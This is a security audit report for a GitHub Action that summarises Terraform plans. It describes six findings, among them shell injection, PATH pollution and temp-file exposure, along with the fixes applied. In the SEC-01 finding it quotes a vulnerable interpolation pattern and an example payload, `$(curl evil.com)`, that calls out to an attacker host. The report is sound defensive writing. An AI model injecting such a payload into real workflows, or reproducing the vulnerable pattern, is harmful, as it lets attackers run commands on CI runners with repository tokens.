# Security & Architecture Findings

> [!NOTE]
> **Remediation Status**: All security findings, operational risks, and architectural issues documented in this report have been **fully resolved, tested, and verified**.

This document outlines the security vulnerabilities, operational risks, and architectural anti-patterns identified during the review of `terraform-summary-action`, along with the technical remediations applied.

---

## Summary of Findings

| ID | Finding | Severity | Category | Status |
| :--- | :--- | :---: | :--- | :---: |
| **SEC-01** | Shell / Command Injection via Inline Expression Interpolation | **High** | Script Injection | **Resolved** |
| **SEC-02** | Global Runner Environment Pollution via `$GITHUB_PATH` Mutation | **Medium** | Environment Tampering | **Resolved** |
| **SEC-03** | Insecure Workspace Temporary Files & Sensitive Plan Data Exposure | **Medium** | Information Disclosure / Traversal | **Resolved** |
| **SEC-04** | GitHub Step Summary Denial-of-Service via Payload Bloat (1024 KiB Limit) | **Medium** | Availability / Workflow Resilience | **Resolved** |
| **SEC-05** | Supply Chain Attack Surface & Dependency Overhead | **Low** | Supply Chain Security | **Resolved** |
| **SEC-06** | Lack of Least-Privilege Permissions and Action Pinning in CI | **Medium** | Workflow Hardening | **Resolved** |

---

## Detailed Findings & Remediations

### SEC-01: Shell / Command Injection via Inline Expression Interpolation

* **Severity**: **High** (CVSS ~8.1)
* **Location**: `action.yml` (original lines 23–26)

#### Vulnerability Description
The original action directly interpolated user-controlled inputs into the body of a bash script:

```yaml
# Vulnerable code
- shell: bash
  run: |
    TF_OUT=$(format-output.sh "${{inputs.log-file}}")
    test -n "${{ inputs.title }}" && echo "## ${{ inputs.title }}" >> $GITHUB_STEP_SUMMARY
    echo "$TF_OUT" >> $GITHUB_STEP_SUMMARY
```

GitHub Actions evaluates `${{ ... }}` expressions as template strings before passing the script to the shell. If `title` or `log-file` contained quotes, command substitutions (e.g., `$(curl evil.com)`), or shell metacharacters (e.g., `;`, `&&`, `` ` ``), an attacker could execute arbitrary commands in the context of the runner with the privileges of `GITHUB_TOKEN`.

#### Remediation
1. We transitioned the action from a composite shell script to a native **Node.js 20 action** (`using: 'node20', main: 'index.js'`).
2. In Node.js actions, inputs are passed by GitHub's runner directly into process environment variables (`INPUT_PLAN_FILE`, `INPUT_TITLE`), entirely bypassing shell interpreters and preventing command injection.

---

### SEC-02: Global Runner Environment Pollution via `$GITHUB_PATH` Mutation

* **Severity**: **Medium**
* **Location**: `action.yml` (original lines 20–21)

#### Vulnerability Description
The original composite action modified the runner's global PATH:

```yaml
# Problematic code
- shell: bash
  run: echo "${{ github.action_path }}" >> $GITHUB_PATH
```

Appending action directories to `$GITHUB_PATH` affects the execution environment of **all subsequent steps** in the caller workflow. On self-hosted or persistent runners, this can cause PATH collision, unintended binary masking, and potential binary hijacking.

#### Remediation
- Removed `$GITHUB_PATH` mutation completely.
- The action executes its entrypoint (`index.js`) directly in its own isolated Node.js runtime.

---

### SEC-03: Insecure Workspace Temporary Files & Sensitive Plan Data Exposure

* **Severity**: **Medium**
* **Location**: `format-output.sh` (original lines 8–10, 38)

#### Vulnerability Description
The previous script created temporary working files directly inside the repository workspace:

```bash
# Problematic code
FILE_PATH="$1"
WORKING_FILE_PATH="__tmp/$FILE_PATH"
mkdir -p "$(dirname "$WORKING_FILE_PATH")"
cp "$FILE_PATH" "$WORKING_FILE_PATH"
...
rm "$WORKING_FILE_PATH"
```

1. **Path Traversal Risk**: If `FILE_PATH` was an absolute path or contained `../`, `__tmp/$FILE_PATH` created malformed or unintended paths outside the expected temporary root.
2. **Sensitive Information Disclosure**: Terraform plans often contain sensitive data (database endpoints, generated tokens, resource IDs). If an error occurred before `rm`, unencrypted plan fragments remained on the runner disk. On self-hosted runners or workflows that archive the workspace, this data could be exposed.

#### Remediation
- The Node.js implementation reads the input plan file directly into memory, parses the JSON structure, and streams the summary output directly to `$GITHUB_STEP_SUMMARY` without creating intermediate files on disk.

---

### SEC-04: GitHub Step Summary Denial-of-Service via Payload Bloat

* **Severity**: **Medium**
* **Location**: Output generation / `$GITHUB_STEP_SUMMARY` handling

#### Vulnerability Description
GitHub Actions enforces a hard limit of **1024 KiB** per step summary. If a workflow attempts to write more than 1024 KiB to `$GITHUB_STEP_SUMMARY`, the GitHub runner rejects the summary and fails the step. Large Terraform plans (e.g., hundreds of resources with verbose JSON) easily exceed 1 MB, causing CI pipelines to fail unexpectedly.

#### Remediation
- Added an automatic payload size safeguard in `lib/formatter.js` (1000 KiB threshold).
- If the plan payload approaches the limit, the action truncates the collapsible block cleanly and appends a warning notice, ensuring the pipeline completes successfully without summary rejection.

---

### SEC-05: Supply Chain Attack Surface & Zero-Dependency Design

* **Severity**: **Low**
* **Location**: Repository root / `package.json`

#### Architectural Decision
Rewriting an action in JavaScript often introduces a `package.json` with external dependencies (e.g., `@actions/core`, `lodash`, etc.) and bundled `node_modules` or minified `dist/index.js` artifacts. This introduces:
- Supply chain vulnerabilities in third-party transitive packages.
- Maintenance overhead and Dependabot alert churn.
- Obfuscated/minified code that is hard to audit during security reviews.

#### Remediation
- The entire action was designed with **zero external dependencies**.
- Built strictly using Node.js 20 native standard library APIs (`fs`, `path`, `process`, and native `node:test` for testing).
- Code is 100% human-readable, transparent to audit, and immune to third-party npm package compromises.

---

### SEC-06: Lack of Least-Privilege Permissions & Action Pinning in CI

* **Severity**: **Medium**
* **Location**: `.github/workflows/ci.yml`

#### Vulnerability Description
The repository previously lacked automated CI testing and workflow security standards. Default GitHub Actions permissions can grant write access to `contents`, `packages`, or `deployments`.

#### Remediation
- Implemented `.github/workflows/ci.yml` with least-privilege token permissions:
  ```yaml
  permissions:
    contents: read
  ```
- Pinned external GitHub Actions to immutable full 40-character commit SHAs with semantic version tags:
  ```yaml
  uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  uses: actions/setup-node@1e60f620b9541d16bece96c5465dc8ee9832e0b5 # v4.0.3
  ```
- Added concurrency controls (`cancel-in-progress: true`) to immediately terminate redundant CI runs on new commits.
